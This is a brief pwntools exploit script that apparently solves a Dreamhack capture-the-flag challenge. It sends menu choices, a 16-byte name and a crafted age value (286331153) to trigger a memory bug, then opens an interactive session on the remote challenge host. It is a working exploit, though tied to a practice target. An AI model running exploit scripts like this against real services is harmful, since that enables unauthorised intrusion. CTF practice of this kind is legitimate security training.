from pwn import *

p = remote('host3.dreamhack.games', '11079')

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Name: ", b"a"*16)
p.sendlineafter(b"Age: ", b"286331153")
p.interactive()